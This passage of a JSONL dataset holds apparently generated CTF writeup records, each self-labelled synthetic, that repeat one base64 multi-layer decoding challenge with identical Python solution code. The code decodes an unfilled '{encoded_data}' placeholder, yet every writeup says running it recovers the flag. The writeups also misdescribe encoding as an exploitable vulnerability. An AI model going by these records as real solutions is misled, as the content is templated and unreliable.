decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/81", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.837523", "synthetic": true}
{"id": "synthetic_encoding_082", "team": "synthetic_team_6", "event": "CTF_2024_Event_16", "challenge_name": "Base64 Multi-layer #83", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/82", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.837552", "synthetic": true}
{"id": "synthetic_encoding_083", "team": "synthetic_team_9", "event": "CTF_2024_Event_17", "challenge_name": "Base64 Multi-layer #84", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/83", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.837568", "synthetic": true}
{"id": "synthetic_encoding_084", "team": "synthetic_team_5", "event": "CTF_2024_Event_2", "challenge_name": "Base64 Multi-layer #85", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/84", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.837580", "synthetic": true}
{"id": "synthetic_encoding_085", "team": "synthetic_team_3", "event": "CTF_2024_Event_12", "challenge_name": "Base64 Multi-layer #86", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/85", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.837592", "synthetic": true}
{"id": "synthetic_encoding_086", "team": "synthetic_team_10", "event": "CTF_2024_Event_2", "challenge_name": "Base64 Multi-layer #87", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/86", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.837609", "synthetic": true}
{"id": "synthetic_encoding_087", "team": "synthetic_team_7", "event": "CTF_2024_Event_4", "challenge_name": "Base64 Multi-layer #88", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/87", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.837620", "synthetic": true}
{"id": "synthetic_encoding_088", "team": "synthetic_team_4", "event": "CTF_2024_Event_12", "challenge_name": "Base64 Multi-layer #89", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/88", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.837632", "synthetic": true}
{"id": "synthetic_encoding_089", "team": "synthetic_team_9", "event": "CTF_2024_Event_5", "challenge_name": "Base64 Multi-layer #90", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/89", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.837643", "synthetic": true}
{"id": "synthetic_encoding_090", "team": "synthetic_team_9", "event": "CTF_2024_Event_10", "challenge_name": "Base64 Multi-layer #91", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/90", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.837655", "synthetic": true}
{"id": "synthetic_encoding_091", "team": "synthetic_team_1", "event": "CTF_2024_Event_8", "challenge_name": "Base64 Multi-layer #92", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/91", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.837667", "synthetic": true}
{"id": "synthetic_encoding_092", "team": "synthetic_team_7", "event": "CTF_2024_Event_19", "challenge_name": "Base64 Multi-layer #93", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/92", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.837679", "synthetic": true}
{"id": "synthetic_encoding_093", "team": "synthetic_team_7", "event": "CTF_2024_Event_1", "challenge_name": "Base64 Multi-layer #94", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/93", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.837693", "synthetic": true}
{"id": "synthetic_encoding_094", "team": "synthetic_team_6", "event": "CTF_2024_Event_6", "challenge_name": "Base64 Multi-layer #95", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/94", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.837705", "synthetic": true}
{"id": "synthetic_encoding_095", "team": "synthetic_team_2", "event": "CTF_2024_Event_13", "challenge_name": "Base64 Multi-layer #96", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/95", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.837717", "synthetic": true}
